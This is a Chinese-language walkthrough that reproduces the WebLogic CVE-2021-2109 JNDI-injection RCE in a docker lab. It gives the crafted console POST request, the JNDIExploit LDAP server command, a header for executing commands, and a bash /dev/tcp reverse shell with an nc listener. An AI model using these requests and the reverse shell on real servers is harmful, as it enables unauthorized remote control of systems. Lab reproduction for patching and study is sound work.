## 一、漏洞描述

2021年1月20日，Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic
Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。

影响版本

  1. WebLogic 3.6.0.0
  2. WebLogic 1.3.0.0
  3. WebLogic 2.1.3.0
  4. WebLogic 2.1.4.0
  5. WebLogic 1.1.0.0

  

## 环境搭建

攻击机（kali）：192.168.159.131 靶机：192.168.159.139

这里使用docker来搭建环境

docker pull ismaleiva90/weblogic12

docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556
ismaleiva90/weblogic12:latest

![1611550059_600e4d6b42ec122e59c50.png!small](https://image.3001.net/images/20210125/1611550059_600e4d6b42ec122e59c50.png!small)

访问http://your-ip:49163/console即可看到页面

![1611550106_600e4d9a5b62bf8a90b4a.png!small](https://image.3001.net/images/20210125/1611550106_600e4d9a5b62bf8a90b4a.png!small)

## 漏洞复现

使用burpsuit截取访问<http://your-ip:49163/console>报文，发送到repeater模块

1、将GET /console/console.portal?_nfpb=true HTTP/1.1修改为POST
/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.159;131:1389/Basic/WeblogicEcho;AdminServer%22)
HTTP/1.1

请注意192.168.159;131地址的第三位后面为分号，192.168.159;131为启动LDAP服务的攻击机IP

2、在cookie上方添加“cmd:id”来获取靶机服务器id信息，如下图所示

![1611550125_600e4dad8ff10e388a690.png!small](https://image.3001.net/images/20210125/1611550125_600e4dad8ff10e388a690.png!small)

3、在攻击机上启动LDAP

下载地址：

https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11

java -jar JNDIExploit-v1.11.jar -i 192.168.159.131

![1611550161_600e4dd15de0e156ef2db.png!small](https://image.3001.net/images/20210125/1611550161_600e4dd15de0e156ef2db.png!small)

4、重放修改过的报文，成功获取到靶机上的id信息

![1611550192_600e4df08388206a8c598.png!small](https://image.3001.net/images/20210125/1611550192_600e4df08388206a8c598.png!small)

5、反弹shell

在<http://www.jackson-t.ca/runtime-exec-payloads.html>网站将bash -i >&
/dev/tcp/192.168.159.131/2333 0>&1 进行base64编码

![1611550210_600e4e02dd2bfacf684b0.png!small](https://image.3001.net/images/20210125/1611550210_600e4e02dd2bfacf684b0.png!small)

将编码后的反弹shell命令复制到下图cmd后面进行重放，同时在攻击机上开启nc –lvvp 2333命令监听2333端口，点击发送

![1611550224_600e4e107ced1b17494be.png!small](https://image.3001.net/images/20210125/1611550224_600e4e107ced1b17494be.png!small)

成功反弹回shell

![1611550232_600e4e1872efeadae9233.png!small](https://image.3001.net/images/20210125/1611550232_600e4e1872efeadae9233.png!small)

## 修复建议

升级官方安全补丁

  

